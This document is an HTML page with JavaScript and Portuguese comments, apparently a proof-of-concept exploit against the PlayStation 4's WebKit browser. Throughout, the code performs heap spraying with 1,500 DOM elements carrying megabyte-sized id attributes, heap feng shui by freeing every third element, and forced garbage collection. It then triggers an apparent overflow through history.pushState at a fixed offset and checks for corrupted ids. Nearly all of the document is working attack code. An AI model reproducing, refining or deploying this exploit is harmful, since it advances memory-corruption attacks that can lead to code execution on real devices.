<!DOCTYPE html>
<html>
<head>
    <title>PS4 DOM Attribute Spray</title>
    <style>
        body { background-color: #001133; color: #aaa; font-family: monospace; padding: 10px; }
        button { 
            font-size: 22px; padding: 20px; width: 100%; margin-bottom: 20px;
            border: 2px solid #00ffff; background: #000; color: #fff; font-weight: bold; cursor: pointer;
        }
        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: #00ffff; }
        .success { color: #fff; background-color: #008800; padding: 5px; font-weight: bold; }
    </style>
</head>
<body>

    <h1>DOM Attribute Spray</h1>
    <p>Mudando o alvo: JS Arrays -> HTML Attributes (IDs)</p>

    <button onclick="startDomSpray()">INICIAR DOM SPRAY</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        const BASE_OFFSET = 709522;
        // Vamos ser agressivos no overflow para garantir que atravesse qualquer padding
        const OVERFLOW_AMT = 1024 * 512; // 512 KB de excesso

        // Tamanho da vítima (String do ID). 
        // Tentamos acertar 1MB (Size Class comum em WebKit)
        const ID_SIZE = 1024 * 1024; 
        const SPRAY_COUNT = 1500; // Quantidade de elementos

        var victims = []; // Armazena os elementos HTML

        function log(msg, type) {
            const el = document.getElementById('log');
            const color = type === 'success' ? '#fff' : '#00ffff';
            const bg = type === 'success' ? '#008800' : 'transparent';
            el.innerHTML += `<div style="color:${color}; background:${bg}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        function startDomSpray() {
            log("1. Gerando " + SPRAY_COUNT + " elementos DIV com IDs gigantes...");

            setTimeout(() => {
                try {
                    // Prepara a string de preenchimento (PADDING)
                    // Usamos 'B' para identificar visualmente
                    let pad = "B".repeat(ID_SIZE);

                    victims = [];
                    const container = document.createElement('div'); // Container invisível

                    // SPRAY: Cria elementos no DOM Heap
                    for(let i=0; i<SPRAY_COUNT; i++) {
                        let div = document.createElement('div');
                        // Prefixo único para identificar qual foi atingido
                        let prefix = "IDX:" + i + "_";
                        // Define o ID gigante
                        div.setAttribute('id', prefix + pad.substring(prefix.length));
                        
                        victims.push(div);
                        // container.appendChild(div); // Opcional: Anexar ao DOM pode mudar a alocação
                    }

                    // FENG SHUI: Criar Buracos
                    log("2. Abrindo buracos no DOM Heap...");
                    // Apagamos referências de 1 a cada 3 elementos para criar gaps
                    for(let i=0; i<SPRAY_COUNT; i+=3) {
                        victims[i] = null;
                    }

                    // Força GC para limpar os buracos
                    forceGC().then(() => {
                        log("3. Disparando Overflow...");
                        triggerExploit();
                    });

                } catch(e) {
                    log("Erro (OOM): " + e.message);
                }
            }, 200);
        }

        function triggerExploit() {
            setTimeout(() => {
                try {
                    let buffer = "A".repeat(BASE_OFFSET);
                    buffer += "\x01".repeat(OVERFLOW_AMT);

                    // A chamada crítica
                    history.pushState({}, "dom_pwn", "/" + buffer);

                    log("4. Verificando corrupção nos IDs...");
                    checkCorruption();

                } catch (e) {
                    log("Erro no exploit: " + e.message);
                }
            }, 500);
        }

        function checkCorruption() {
            let found = false;
            // Checamos os elementos que sobraram
            for(let i=0; i<victims.length; i++) {
                let div = victims[i];
                if(!div) continue; // Pula os buracos

                let id = div.getAttribute('id');
                
                // CRITÉRIO DE SUCESSO:
                // 1. O tamanho do ID mudou? (Significa que apagamos o null terminator)
                // 2. O conteúdo tem o byte 0x01? (Significa que sobrescrevemos os dados)
                
                if (id.length !== ID_SIZE) {
                    log("!!! SUCESSO (LENGTH) !!! Index: " + i + " Novo Tam: " + id.length, 'success');
                    found = true;
                    alert("DOM SPRAY SUCESSO!");
                    break;
                }
                
                // Checagem rápida no meio da string
                if (id.charCodeAt(500) === 1 || id.charCodeAt(ID_SIZE - 50) === 1) {
                     log("!!! SUCESSO (CONTENT) !!! Index: " + i + " Conteúdo corrompido!", 'success');
                     found = true;
                     break;
                }
            }
            
            if(!found) log("Nenhum ID corrompido. O isolamento continua.");
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 500));
        }
    </script>
</body>
</html>
